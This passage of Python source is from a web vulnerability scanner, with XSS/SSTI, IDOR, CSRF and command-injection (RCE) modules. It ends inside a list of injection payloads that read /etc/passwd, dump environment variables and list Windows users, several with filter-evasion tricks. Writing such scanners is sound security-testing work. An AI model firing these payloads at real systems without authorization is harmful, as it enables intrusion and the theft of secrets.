                                    _size_diff = abs(len(response_content) - _bl_len)
                                    # Natural server variance — if the two baselines differ a lot, skip
                                    _variance = abs(len(_bl1.text) - len(_bl2.text))
                                    if _size_diff > 500 and _variance < 100:
                                        vulnerabilities.append(VulnerabilityResult(
                                            url=url,
                                            vulnerability_type=VulnerabilityType.XSS,
                                            severity="CRITICAL",
                                            vulnerable_params=[param_name],
                                            payload_used=payload,
                                            evidence=f"Angular SSTI — payload absent from 200 response, stable size diff={_size_diff}B (variance={_variance}B)",
                                            details=f"Angular template injection in '{param_name}' — expression evaluated by engine",
                                            subtype="SSTI - Angular Template Injection",
                                            impact="Angular template engine evaluated attacker expression — RCE possible via constructor chain",
                                        ))
                                        return vulnerabilities
                                except Exception:
                                    pass
                        continue  # SSTI probe — never run as plain XSS check

                    if payload in response_content:
                        pl = payload.lower()
                        _executable_tags = [
                            '<script', 'javascript:', 'vbscript:',
                            'onerror=', 'onload=', 'onfocus=', 'ontoggle=',
                            'onmouseover=', 'onmouseout=', 'onclick=',
                            'onbegin=', 'onstart=', 'onanimationstart=',
                            'onpointerover=', 'onauxclick=', 'onanimationend=',
                            '<svg', '<img', '<iframe', '<body', '<input',
                            '<details', '<video', '<audio', '<marquee',
                            '<object', '<embed', '<form', '<a ',
                            '<meter', '<time', '<base', '<link',
                            'formaction=',
                        ]
                        is_executable = any(t in pl for t in _executable_tags)

                        if is_executable:
                            pos = response_content.find(payload)
                            snippet = response_content[max(0, pos - 50): pos + len(payload) + 50]

                            # FP guard 1: payload inside HTML comment → skip
                            if '<!--' in response_content[:pos] and '-->' not in response_content[:pos].split('<!--')[-1]:
                                continue

                            # FP guard 2: payload properly HTML-encoded → skip
                            if payload.replace('<', '&lt;').replace('>', '&gt;') in response_content \
                                    and payload.replace('<', '&lt;') in snippet:
                                continue

                            # FP guard 3: must be inside an HTML tag or script block context
                            # Check: the < appears raw (not encoded) in the snippet
                            has_raw_angle = '<' in snippet and '&lt;' not in snippet.replace(snippet[snippet.find('<'):snippet.find('<')+4], '')
                            has_js_context = 'javascript:' in snippet.lower() or re.search(r'\bon\w+\s*=', snippet, re.IGNORECASE)

                            if has_raw_angle or has_js_context:
                                vuln = VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.XSS,
                                    severity="HIGH",
                                    vulnerable_params=[param_name],
                                    payload_used=payload,
                                    evidence="Payload reflected unencoded with executable markup in response",
                                    details=f"Reflected XSS in parameter '{param_name}'",
                                    subtype=item.subtype,
                                    impact=item.impact,
                                )
                                vulnerabilities.append(vuln)
                                return vulnerabilities

                except Exception:
                    continue

        except Exception:
            pass

        return vulnerabilities

    async def _scan_forms(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulnerabilities = []

        try:
            response = await client.get(url, timeout=self.config.vuln_timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms[:5]:
                action = form.get('action', url)
                method = form.get('method', 'get').lower()
                inputs = form.find_all('input')
                form_data = {}

                for input_tag in inputs:
                    input_name = input_tag.get('name')
                    input_type = input_tag.get('type', 'text')
                    if input_name and input_type not in ['submit', 'button']:
                        form_data[input_name] = 'test'

                if not form_data:
                    continue

                for field_name in list(form_data.keys())[:3]:
                    form_action = action if action.startswith('http') else urllib.parse.urljoin(url, action)

                    # ── Baseline for this field — check if payload appears in clean response ──
                    try:
                        if method == 'post':
                            _bl_resp = await client.post(form_action, data=form_data,
                                                         timeout=self.config.vuln_timeout,
                                                         follow_redirects=self.config.follow_redirects)
                        else:
                            _bl_resp = await client.get(form_action, params=form_data,
                                                        timeout=self.config.vuln_timeout,
                                                        follow_redirects=self.config.follow_redirects)
                        _baseline_form = _bl_resp.text
                    except Exception:
                        _baseline_form = ""

                    # Skip SSTI probes in form scanner (they need specific eval check)
                    _ssti_set = {"{{7*7}}", "{{7*'7'}}", "<%= 7*7 %>", "#{7*7}",
                                 "${7*7}", "{{constructor.constructor('alert(1)')()}}"}

                    for item in self.xss_payloads:
                        payload = item.payload

                        if payload in _ssti_set:
                            continue

                        test_data = form_data.copy()
                        test_data[field_name] = payload

                        try:
                            if method == 'post':
                                test_response = await client.post(
                                    form_action, data=test_data,
                                    timeout=self.config.vuln_timeout,
                                    follow_redirects=self.config.follow_redirects)
                            else:
                                test_response = await client.get(
                                    form_action, params=test_data,
                                    timeout=self.config.vuln_timeout,
                                    follow_redirects=self.config.follow_redirects)

                            response_content = test_response.text

                            # Skip if payload already appears in baseline (pre-populated field)
                            if _baseline_form and payload in _baseline_form:
                                continue

                            if payload in response_content:
                                pl = payload.lower()
                                _executable_tags = [
                                    '<script', 'javascript:', 'vbscript:',
                                    'onerror=', 'onload=', 'onfocus=', 'ontoggle=',
                                    'onmouseover=', 'onmouseout=', 'onclick=',
                                    'onbegin=', 'onstart=', 'onanimationstart=',
                                    'onpointerover=', 'onauxclick=', 'onanimationend=',
                                    '<svg', '<img', '<iframe', '<body', '<input',
                                    '<details', '<video', '<audio', '<marquee',
                                    '<object', '<embed', '<form', '<a ',
                                    'formaction=',
                                ]
                                is_executable = any(t in pl for t in _executable_tags)
                                if is_executable:
                                    pos = response_content.find(payload)
                                    snippet = response_content[max(0, pos - 50): pos + len(payload) + 50]

                                    # FP guard 1: inside HTML comment
                                    if '<!--' in response_content[:pos] and '-->' not in response_content[:pos].split('<!--')[-1]:
                                        continue

                                    # FP guard 2: HTML-encoded
                                    if payload.replace('<', '&lt;').replace('>', '&gt;') in response_content \
                                            and payload.replace('<', '&lt;') in snippet:
                                        continue

                                    # FP guard 3: raw angle bracket or JS context required
                                    has_raw_angle = '<' in snippet and '&lt;' not in snippet.replace(snippet[snippet.find('<'):snippet.find('<')+4], '')
                                    has_js_context = 'javascript:' in snippet.lower() or re.search(r'\bon\w+\s*=', snippet, re.IGNORECASE)

                                    if has_raw_angle or has_js_context:
                                        vuln = VulnerabilityResult(
                                            url=form_action,
                                            vulnerability_type=VulnerabilityType.XSS,
                                            severity="HIGH",
                                            vulnerable_params=[field_name],
                                            payload_used=payload,
                                            evidence="Payload reflected unencoded with executable markup in form response",
                                            details=f"Reflected XSS in form field '{field_name}'",
                                            subtype=item.subtype,
                                            impact=item.impact,
                                        )
                                        vulnerabilities.append(vuln)
                                        break

                        except Exception:
                            continue

        except Exception:
            pass

        return vulnerabilities

class IDORScanner:
    IDOR_PARAM_NAMES = {
        'id', 'user', 'uid', 'userid', 'user_id', 'account', 'account_id',
        'profile', 'profile_id', 'item', 'item_id', 'order', 'order_id',
        'doc', 'document', 'file', 'file_id', 'ref', 'record', 'record_id',
        'pid', 'cid', 'rid', 'tid', 'mid', 'bid', 'oid', 'num', 'no',
    }

    # Params that are numeric but NOT IDOR candidates — pagination, sorting, limits
    _PAGINATION_PARAMS = {
        'page', 'p', 'pg', 'paged', 'offset', 'start', 'skip',
        'limit', 'per_page', 'per', 'size', 'count', 'rows', 'length',
        'step', 'from', 'to', 'max', 'min', 'index', 'idx',
        'sort', 'order', 'dir', 'direction', 'asc', 'desc',
        'year', 'month', 'day', 'week', 'hour',
        'qty', 'quantity', 'amount', 'price', 'total', 'score',
        'rating', 'weight', 'width', 'height', 'depth',
        'version', 'ver', 'v', 'revision', 'rev',
        'tab', 'section', 'col', 'row', 'zoom', 'level',
    }

    def __init__(self, config: Config):
        self.config = config

    def _is_idor_candidate(self, name: str, value: str) -> bool:
        name_lower = name.lower()

        # Exclude known pagination / non-object params first
        if name_lower in self._PAGINATION_PARAMS:
            return False
        # Also exclude if name contains pagination keywords
        if any(pg in name_lower for pg in ('page', 'limit', 'offset', 'sort', 'order', 'size', 'count', 'index')):
            return False

        # Named IDOR param — include regardless of value
        if any(name_lower == p or name_lower.endswith('_' + p) or name_lower.endswith('id') for p in self.IDOR_PARAM_NAMES):
            return True

        # Numeric value only if name looks like an object reference
        # Require at least one alpha char in name that suggests an entity
        if value.isdigit() and len(name_lower) >= 2:
            # Must not be a pure number-like name
            if not name_lower.isdigit():
                return True

        return False

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulnerabilities = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            candidate_params = {k: v for k, v in params.items() if self._is_idor_candidate(k, v[0])}

            if not candidate_params:
                # ── Path-based IDOR: detect /users/2/profile style URLs ──
                path_vulns = await self._test_path_idor(client, url, parsed)
                return path_vulns

            for param_name, param_val in list(candidate_params.items())[:self.config.max_params_test]:
                raw = param_val[0]
                if raw.isdigit():
                    original_id = int(raw)
                    test_ids = [
                        original_id - 1,
                        original_id + 1,
                        original_id + 100,
                        0,
                        -1,
                        99999,
                    ]
                else:
                    original_id = None
                    test_ids = [1, 2, 99, 0, -1, 99999]

                try:
                    baseline = await client.get(
                        url, timeout=self.config.vuln_timeout,
                        follow_redirects=self.config.follow_redirects
                    )
                    baseline_len = len(baseline.text)
                    baseline_status = baseline.status_code
                except Exception:
                    continue

                for test_id in test_ids:
                    if original_id is not None and test_id == original_id:
                        continue
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [str(test_id)]
                        test_query = urllib.parse.urlencode(test_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, test_query, parsed.fragment
                        ))

                        resp = await client.get(
                            test_url, timeout=self.config.vuln_timeout,
                            follow_redirects=self.config.follow_redirects
                        )

                        # ── High-confidence: large structural difference + data markers ─
                        if (resp.status_code == 200 and baseline_status == 200
                                and len(resp.text) > 300):
                            len_diff = abs(len(resp.text) - baseline_len)
                            max_len  = max(len(resp.text), baseline_len, 1)
                            # Must be >10% AND >400 bytes
                            if len_diff > 400 and (len_diff / max_len) > 0.10:
                                _data_re = re.compile(
                                    r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}'
                                    r'|"(?:id|user|email|name|phone|address)"\s*:'
                                    r'|<td[^>]*>[^<]{3,}</td>',
                                    re.IGNORECASE
                                )
                                resp_has_data     = bool(_data_re.search(resp.text))
                                baseline_has_data = bool(_data_re.search(baseline.text))
                                if resp_has_data and not baseline_has_data:
                                    id_label = f"ID {original_id}" if original_id is not None else f"value '{raw}'"
                                    vuln = VulnerabilityResult(
                                        url=url,
                                        vulnerability_type=VulnerabilityType.IDOR,
                                        severity="HIGH",
                                        vulnerable_params=[param_name],
                                        payload_used=str(test_id),
                                        evidence=(
                                            f"{id_label} → {baseline_len}B, "
                                            f"ID {test_id} → {len(resp.text)}B "
                                            f"(+{len_diff}B / {len_diff/max_len:.0%}) — data markers found"
                                        ),
                                        details=f"Parameter '{param_name}' may expose other users' data",
                                        subtype="Object Enumeration",
                                        impact="Accessing other users' data or records by manipulating the ID parameter",
                                    )
                                    vulnerabilities.append(vuln)
                                    break

                        # ── 403 on alternate ID = enumerable references ──────────
                        # ── 403 = object exists but access denied = IDOR candidate ─
                        if baseline_status == 200 and resp.status_code == 403:
                            # Confirm baseline has real content (not just an error page)
                            if baseline_len > 500:
                                vuln = VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.IDOR,
                                    severity="MEDIUM",
                                    vulnerable_params=[param_name],
                                    payload_used=str(test_id),
                                    evidence=(
                                        f"ID {test_id} returned 403 Forbidden — "
                                        f"baseline ID returned 200 OK ({baseline_len}B). "
                                        f"Object references appear enumerable."
                                    ),
                                    details=f"Parameter '{param_name}' exposes enumerable object references",
                                    subtype="Access Control Bypass",
                                    impact="Enumerating existing IDs and identifying protected records",
                                )
                                vulnerabilities.append(vuln)
                                break

                        # ── Content variation: meaningful structural difference ───
                        if baseline_status == 200 and resp.status_code == 200 and resp.text != baseline.text:
                            len_diff = abs(len(resp.text) - baseline_len)
                            max_len  = max(len(resp.text), baseline_len, 1)
                            # Stricter: >15% AND >500 bytes
                            if len_diff > 500 and (len_diff / max_len) > 0.15:
                                vuln = VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.IDOR,
                                    severity="MEDIUM",
                                    vulnerable_params=[param_name],
                                    payload_used=str(test_id),
                                    evidence=(
                                        f"ID {test_id} → {len_diff}B difference "
                                        f"({len_diff/max_len:.0%}) from original"
                                    ),
                                    details=f"Parameter '{param_name}' returns significantly different data per ID — possible IDOR",
                                    subtype="Content Variation",
                                    impact="Possible unauthorized access to data belonging to other users",
                                )
                                vulnerabilities.append(vuln)
                                break

                    except Exception:
                        continue

        except Exception:
            pass

        return vulnerabilities

    async def _test_path_idor(self, client, url: str, parsed) -> List[VulnerabilityResult]:
        """Detect IDOR in REST-style paths like /users/2/profile"""
        vulnerabilities = []
        try:
            path_parts = parsed.path.strip('/').split('/')
            # Find numeric segments in the path
            numeric_indices = [i for i, p in enumerate(path_parts) if p.isdigit()]
            if not numeric_indices:
                return vulnerabilities

            base = f"{parsed.scheme}://{parsed.netloc}"
            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=self.config.follow_redirects)
                baseline_len    = len(baseline.text)
                baseline_status = baseline.status_code
            except Exception:
                return vulnerabilities

            for idx in numeric_indices:
                original_id = int(path_parts[idx])
                for test_id in [original_id + 1, original_id - 1, original_id + 100, 0, 1, 99999]:
                    if test_id == original_id or test_id < 0:
                        continue
                    try:
                        new_parts = path_parts.copy()
                        new_parts[idx] = str(test_id)
                        test_path = '/' + '/'.join(new_parts)
                        test_url  = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, test_path,
                            parsed.params, parsed.query, parsed.fragment
                        ))
                        resp = await client.get(test_url, timeout=self.config.vuln_timeout,
                                                follow_redirects=self.config.follow_redirects)

                        if resp.status_code == 200 and baseline_status == 200:
                            len_diff = abs(len(resp.text) - baseline_len)
                            max_len  = max(len(resp.text), baseline_len, 1)
                            if len_diff > 300 and (len_diff / max_len) > 0.08:
                                _data_re = re.compile(
                                    r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}'
                                    r'|"(?:id|user|email|name|phone|address)"\s*:'
                                    r'|<td[^>]*>[^<]{3,}</td>',
                                    re.IGNORECASE
                                )
                                if _data_re.search(resp.text):
                                    vulnerabilities.append(VulnerabilityResult(
                                        url=test_url,
                                        vulnerability_type=VulnerabilityType.IDOR,
                                        severity="HIGH",
                                        vulnerable_params=[f"path segment [{idx}]"],
                                        payload_used=str(test_id),
                                        evidence=(
                                            f"Path ID {original_id} → {baseline_len}B, "
                                            f"ID {test_id} → {len(resp.text)}B "
                                            f"(Δ{len_diff}B / {len_diff/max_len:.0%}) — data markers found"
                                        ),
                                        details=f"Path segment '{path_parts[idx]}' in '{parsed.path}' may expose other users' data",
                                        subtype="Path-based IDOR",
                                        impact="Changing numeric ID in URL path exposes other users' records",
                                    ))
                                    return vulnerabilities

                        if baseline_status == 200 and resp.status_code == 403:
                            vulnerabilities.append(VulnerabilityResult(
                                url=test_url,
                                vulnerability_type=VulnerabilityType.IDOR,
                                severity="MEDIUM",
                                vulnerable_params=[f"path segment [{idx}]"],
                                payload_used=str(test_id),
                                evidence=f"Path ID {test_id} returned 403 — object exists but is access-controlled",
                                details=f"Path-based IDOR candidate: '{parsed.path}' with ID {test_id}",
                                subtype="Path-based IDOR (403 enumeration)",
                                impact="Confirms enumerable object references in URL path",
                            ))
                            return vulnerabilities

                    except Exception:
                        continue
        except Exception:
            pass
        return vulnerabilities

class CSRFScanner:

    TRACKING_COOKIES = {
        '__ga', '__gid', '__gads', '__utm', '_fbp', '_fbc', '__cfduid',
        '__cf_bm', 'cf_clearance', '_gcl_au', '_gcl_aw', 'hubspotutk',
        '__hstc', '__hssc', '__hssrc', 'ajs_user_id', 'ajs_anonymous_id',
        'amplitude_id', 'mixpanel', '_hjid', '_hjIncludedInSample',
        'intercom', 'drift', 'crisp', 'attribution', 'ATTRIBUTION',
        'BUCKETING', 'bucketing', 'visitorid', 'visitor_id', 'asset_push',
        'init', 'optimizelyEndUserId', '_uetsid', '_uetvid',
    }

    SESSION_COOKIE_PATTERNS = [
        'sess', 'session', 'auth', 'token', 'user', 'login', 'account',
        'member', 'uid', 'userid', 'sid', 'jwt', 'bearer',
    ]

    def __init__(self, config: Config):
        self.config = config
        self.csrf_token_names = [
            'csrf_token', 'csrftoken', '_csrf', 'csrf', '_token',
            'authenticity_token', 'csrf_field', 'anti_csrf',
            '__requestverificationtoken', 'xsrf_token', '_xsrf',
            'verify_token', 'form_key', 'nonce',
        ]

    def _is_tracking_cookie(self, name: str) -> bool:
        name_lower = name.lower()
        for tracking in self.TRACKING_COOKIES:
            if tracking.lower() in name_lower:
                return True
        return False

    def _is_session_cookie(self, name: str) -> bool:
        name_lower = name.lower()
        for pattern in self.SESSION_COOKIE_PATTERNS:
            if pattern in name_lower:
                return True
        return False

    def _parse_set_cookie_flags(self, resp) -> dict:
        cookies_info = {}
        for header_val in resp.headers.get_list('set-cookie') if hasattr(resp.headers, 'get_list') else [resp.headers.get('set-cookie', '')]:
            if not header_val:
                continue
            parts = [p.strip().lower() for p in header_val.split(';')]
            if not parts[0]:
                continue
            name = parts[0].split('=')[0].strip()
            flags = parts[1:]
            cookies_info[name] = {
                'samesite': any('samesite' in f for f in flags),
                'httponly': any('httponly' in f for f in flags),
                'secure': any('secure' in f for f in flags),
                'raw': header_val,
            }
        return cookies_info

    def _has_frame_protection(self, headers: dict, csp: str) -> bool:
        if 'x-frame-options' in headers:
            return True
        if csp and 'frame-ancestors' in csp.lower():
            return True
        return False

    def _form_has_csrf_protection(self, form, soup, headers: dict) -> bool:
        inputs = form.find_all('input')
        input_names = [(i.get('name') or '').lower() for i in inputs]

        if any(tok in name for name in input_names for tok in self.csrf_token_names):
            return True

        meta_csrf = soup.find('meta', attrs={'name': lambda n: n and 'csrf' in n.lower()})
        if meta_csrf:
            return True

        if any(h in headers for h in ['x-csrf-token', 'x-xsrf-token']):
            return True

        scripts = soup.find_all('script')
        for script in scripts:
            if script.string and any(t in script.string.lower() for t in ['csrf', 'xsrf', '_token']):
                return True

        return False

    def _is_external_form(self, form_url: str, page_url: str) -> bool:
        try:
            form_domain = urllib.parse.urlparse(form_url).netloc
            page_domain = urllib.parse.urlparse(page_url).netloc
            return form_domain and form_domain != page_domain
        except Exception:
            return False

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulnerabilities = []
        try:
            resp = await client.get(
                url, timeout=self.config.vuln_timeout,
                follow_redirects=self.config.follow_redirects
            )
            soup = BeautifulSoup(resp.text, 'html.parser')
            headers = {k.lower(): v for k, v in resp.headers.items()}
            csp = headers.get('content-security-policy', '')

            # ── X-Frame-Options / Clickjacking ───────────────────────────
            if not self._has_frame_protection(headers, csp):
                vulnerabilities.append(VulnerabilityResult(
                    url=url,
                    vulnerability_type=VulnerabilityType.CSRF,
                    severity="MEDIUM",
                    vulnerable_params=["headers"],
                    payload_used="Missing X-Frame-Options / CSP frame-ancestors",
                    evidence="Neither X-Frame-Options nor CSP frame-ancestors is set",
                    details="Page can be embedded in an iframe — clickjacking risk",
                    subtype="Missing Security Headers",
                    impact="Page can be embedded in iframe — enables clickjacking attacks",
                ))

            # ── POST forms without CSRF protection ───────────────────────
            forms = soup.find_all('form')
            for form in forms:
                method = form.get('method', 'get').lower()
                if method != 'post':
                    continue

                action = form.get('action', url)
                form_url = action if action.startswith('http') else urllib.parse.urljoin(url, action)

                if self._is_external_form(form_url, url):
                    continue

                if self._form_has_csrf_protection(form, soup, headers):
                    # ── Extra check: is the token actually validated? ─────────
                    # Submit the form with a tampered token — if server still returns
                    # 200 with same content, the token is present but NOT enforced
                    try:
                        inputs = form.find_all('input')
                        form_data_test = {}
                        token_field = None
                        for inp in inputs:
                            name = inp.get('name', '')
                            val  = inp.get('value', 'test')
                            if name:
                                form_data_test[name] = val
                                if any(t in name.lower() for t in self.csrf_token_names):
                                    token_field = name

                        if token_field:
                            # Tamper the token
                            form_data_test[token_field] = "tampered_csrf_token_y2s_test"
                            try:
                                tamper_resp = await client.post(
                                    form_url, data=form_data_test,
                                    timeout=self.config.vuln_timeout,
                                    follow_redirects=self.config.follow_redirects
                                )
                                # If server accepts tampered token (200 without redirect to error)
                                _reject_signs = ['invalid', 'forbidden', 'csrf', 'token', 'expired', '403', 'mismatch']
                                body_lower = tamper_resp.text.lower()
                                token_rejected = (
                                    tamper_resp.status_code in (403, 419, 422)
                                    or any(s in body_lower for s in _reject_signs)
                                )
                                if not token_rejected and tamper_resp.status_code == 200:
                                    vulnerabilities.append(VulnerabilityResult(
                                        url=form_url,
                                        vulnerability_type=VulnerabilityType.CSRF,
                                        severity="CRITICAL",
                                        vulnerable_params=["form"],
                                        payload_used=f"Tampered CSRF token in '{token_field}'",
                                        evidence=f"Server returned 200 OK after submitting tampered token '{token_field}' — token not validated server-side",
                                        details="CSRF token exists in form but server does NOT validate it",
                                        subtype="CSRF Token Not Validated",
                                        impact="Attacker can forge requests with any token value — CSRF fully exploitable",
                                    ))
                            except Exception:
                                pass
                    except Exception:
                        pass
                    continue

                vulnerabilities.append(VulnerabilityResult(
                    url=form_url,
                    vulnerability_type=VulnerabilityType.CSRF,
                    severity="HIGH",
                    vulnerable_params=["form"],
                    payload_used="POST form without CSRF token",
                    evidence="POST form has no detectable CSRF protection",
                    details="Form accepts POST requests without anti-CSRF token",
                    subtype="Missing CSRF Token",
                    impact="Attacker can force authenticated user to perform actions without their knowledge",
                ))

            # ── Cookie flags — session cookies only ──────────────────────
            set_cookie_headers = []
            for k, v in resp.headers.items():
                if k.lower() == 'set-cookie':
                    set_cookie_headers.append(v)

            session_no_samesite = []
            session_no_httponly = []
            session_no_secure = []

            for raw in set_cookie_headers:
                parts = [p.strip() for p in raw.split(';')]
                if not parts[0]:
                    continue
                name = parts[0].split('=')[0].strip()
                flags_lower = [p.lower() for p in parts[1:]]

                if self._is_tracking_cookie(name):
                    continue

                if not self._is_session_cookie(name):
                    continue

                if not any('samesite' in f for f in flags_lower):
                    session_no_samesite.append(name)
                if not any('httponly' in f for f in flags_lower):
                    session_no_httponly.append(name)
                if not any(f == 'secure' or f.startswith('secure') for f in flags_lower):
                    session_no_secure.append(name)

            if session_no_samesite:
                vulnerabilities.append(VulnerabilityResult(
                    url=url,
                    vulnerability_type=VulnerabilityType.CSRF,
                    severity="MEDIUM",
                    vulnerable_params=["cookies"],
                    payload_used="Session cookie without SameSite",
                    evidence=f"Session cookies missing SameSite: {', '.join(session_no_samesite)}",
                    details="Session cookies without SameSite attribute facilitate CSRF",
                    subtype="Insecure Cookie - SameSite",
                    impact="Cookies sent with cross-site requests — facilitates CSRF attacks",
                ))

            if session_no_httponly:
                vulnerabilities.append(VulnerabilityResult(
                    url=url,
                    vulnerability_type=VulnerabilityType.CSRF,
                    severity="MEDIUM",
                    vulnerable_params=["cookies"],
                    payload_used="Session cookie without HttpOnly",
                    evidence=f"Session cookies missing HttpOnly: {', '.join(session_no_httponly)}",
                    details="Session cookies without HttpOnly can be accessed via JavaScript",
                    subtype="Insecure Cookie - HttpOnly",
                    impact="XSS attacks can steal cookies directly via document.cookie",
                ))

            if session_no_secure:
                vulnerabilities.append(VulnerabilityResult(
                    url=url,
                    vulnerability_type=VulnerabilityType.CSRF,
                    severity="LOW",
                    vulnerable_params=["cookies"],
                    payload_used="Session cookie without Secure flag",
                    evidence=f"Session cookies missing Secure flag: {', '.join(session_no_secure)}",
                    details="Session cookies without Secure flag can be sent over HTTP",
                    subtype="Insecure Cookie - Secure Flag",
                    impact="Cookies may be transmitted over unencrypted HTTP — susceptible to man-in-the-middle attacks",
                ))

        except Exception:
            pass

        return vulnerabilities

class RCEScanner:
    def __init__(self, config: Config):
        self.config = config

        self.rce_payloads = [
            # Unix - Command Separators
            PayloadItem("; id", "Unix - Command Separator", "Executes id command — reveals server user and privileges"),
            PayloadItem("| id", "Unix - Pipe", "Pipes output to id command — reveals current user identity"),
            PayloadItem("& id", "Unix - Background", "Executes id command in background process"),
            PayloadItem("|| id", "Unix - OR Chain", "Executes id if first command fails — OR chaining"),
            PayloadItem("&& id", "Unix - AND Chain", "Executes id if first command succeeds — AND chaining"),
            PayloadItem(";id", "Unix - No Space", "Bypasses whitespace/space filters"),
            PayloadItem("|id", "Unix - No Space Pipe", "Bypasses whitespace/space filters with pipe"),
            PayloadItem("`id`", "Unix - Backtick", "Executes id via backtick command substitution"),
            PayloadItem("$(id)", "Unix - Subshell", "Executes id via $() subshell substitution"),
            PayloadItem("; whoami", "Unix - whoami", "Reveals current username on the server"),
            PayloadItem("| whoami", "Unix - whoami Pipe", "Reveals username via pipe operator"),
            PayloadItem("`whoami`", "Unix - whoami Backtick", "Reveals username via backtick substitution"),
            PayloadItem("$(whoami)", "Unix - whoami Subshell", "Reveals username via subshell substitution"),
            PayloadItem("; uname -a", "Unix - System Info", "Reveals full system info — OS version, kernel, and hostname"),
            PayloadItem("; cat /etc/passwd", "Unix - File Read", "Reads /etc/passwd — exposes server user accounts and structure"),
            PayloadItem("; cat /etc/hostname", "Unix - Hostname", "Reveals server hostname on the network"),
            PayloadItem("; printenv", "Unix - Env Vars", "Reveals environment variables — may contain secrets, API keys, or passwords"),
            PayloadItem("; echo $PATH", "Unix - PATH", "Reveals executable PATH — useful for further exploitation"),
            PayloadItem("; echo vulnerable_y2s", "Unix - Echo Test", "Confirms command execution with a custom marker string"),
            PayloadItem("$(echo vulnerable_y2s)", "Unix - Echo Subshell", "Confirms execution via subshell substitution"),
            PayloadItem("`echo vulnerable_y2s`", "Unix - Echo Backtick", "Confirms execution via backtick substitution"),

            # Windows
            PayloadItem("& whoami", "Windows - whoami", "Reveals Windows server username"),
            PayloadItem("| whoami", "Windows - whoami Pipe", "Reveals username via Windows pipe"),
            PayloadItem("& dir", "Windows - dir", "Lists contents of the current directory"),
            PayloadItem("& echo vulnerable_y2s", "Windows - Echo Test", "Confirms command execution on Windows server"),
            PayloadItem("& type C:\\Windows\\win.ini", "Windows - File Read", "Reads Windows system file — confirms filesystem access"),

            # Time-based
            PayloadItem("; sleep 5", "Time-based - Unix", "Confirms RCE via intentional delay — Unix"),
            PayloadItem("| sleep 5", "Time-based - Unix Pipe", "Confirms RCE via time delay using pipe"),
            PayloadItem("; ping -c 5 127.0.0.1", "Time-based - Ping Unix", "Confirms RCE via ping delay — Unix"),
            PayloadItem("; ping -n 5 127.0.0.1", "Time-based - Ping Windows", "Confirms RCE via ping delay — Windows"),

            # URL/Newline Encoded
            PayloadItem("%0aid", "Encoded - Newline", "Bypasses filters using URL-encoded newline character (%0a)"),
            PayloadItem("%0a whoami", "Encoded - Newline whoami", "Bypasses filters to reach whoami using encoded newline"),
            PayloadItem("\nid", "Encoded - Raw Newline", "Bypasses filters using raw newline character injection"),

            # ── More Unix separators / obfuscation ───────────────────────────
            PayloadItem(";id;",               "Unix - Semicolons Both",    "id wrapped in semicolons"),
            PayloadItem("|id|",               "Unix - Pipes Both",         "id wrapped in pipes"),
            PayloadItem(";{id}",              "Unix - Brace Group",        "id via brace grouping"),
            PayloadItem(";$IFS$9id",          "Unix - IFS var",            "IFS env variable as space bypass"),
            PayloadItem(";id%0a",             "Unix - Newline Append",     "Newline appended to bypass"),
            PayloadItem("`;id`",              "Unix - Backtick Semicolon", "Backtick with leading semicolon"),
            PayloadItem(";i\\d",              "Unix - Backslash Split",    "Backslash inside command name"),
            PayloadItem(";wh\\oami",          "Unix - Backslash whoami",   "Backslash bypass in whoami"),
            PayloadItem(";/usr/bin/id",       "Unix - Absolute Path id",   "Absolute path bypasses PATH filters"),
            PayloadItem(";/usr/bin/whoami",   "Unix - Absolute whoami",    "Absolute path whoami"),
            PayloadItem("|cat${IFS}/etc/passwd","Unix - IFS cat passwd",   "cat /etc/passwd using IFS as space"),
            PayloadItem(";cat<>/etc/passwd",  "Unix - Redirect cat",       "Redirect operator as space bypass"),

            # ── Encoded variants ──────────────────────────────────────────────
            PayloadItem("%3Bid",              "Encoded ; id",              "URL-encoded semicolon + id"),
            PayloadItem("%7Cid",              "Encoded | id",              "URL-encoded pipe + id"),
            PayloadItem("%0aid",              "Encoded %0a id",            "URL-encoded newline + id"),
            PayloadItem("%26id",              "Encoded & id",              "URL-encoded & + id"),
            PayloadItem("%26%26id",           "Encoded && id",             "URL-encoded && + id"),

            # ── More Windows ──────────────────────────────────────────────────
            PayloadItem("& ipconfig",             "Windows - ipconfig",    "Network config — reveals IP and adapters"),
            PayloadItem("& net user",             "Windows - net user",    "Lists Windows user accounts"),
            PayloadItem("| net user",             "Windows - net user pipe","Lists users via pipe"),
            PayloadItem("& systeminfo",           "Windows - systeminfo",  "Full system info"),
            PayloadItem("& echo %USERNAME%",      "Windows - USERNAME",    "Prints current Windows username"),
            PayloadItem("& type C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows - hosts", "Read hosts file"),
            PayloadItem("& set",                  "Windows - env vars",    "Print all environment variables"),

            # ── Advanced evasion / filter bypass ─────────────────────────────
            PayloadItem(";c''at /etc/passwd",      "Unix - Quote Split",     "Single-quote split in command name bypasses keyword filters"),
            PayloadItem(";c\"a\"t /etc/passwd",    "Unix - DQ Split",        "Double-quote split in cat bypasses WAF string match"),
            PayloadItem(";$'c'$'a'$'t' /etc/passwd","Unix - ANSI-C Quote",   "ANSI-C quoting to split command string"),
            PayloadItem(";/???/??t /etc/passwd",   "Unix - Glob Path",       "Glob wildcard resolves to /bin/cat — bypasses path filters"),
            PayloadItem(";/???/b??/c?? /etc/p?sswd","Unix - Glob Both",      "Glob for both binary and file path"),
            PayloadItem(";{cat,/etc/passwd}",      "Unix - Brace Expansion", "Brace expansion without spaces — bypasses space filters"),
            PayloadItem(";X=$'cat\\x20/etc/passwd';$X","Unix - Hex Space",   "Hex-encoded space character in variable"),
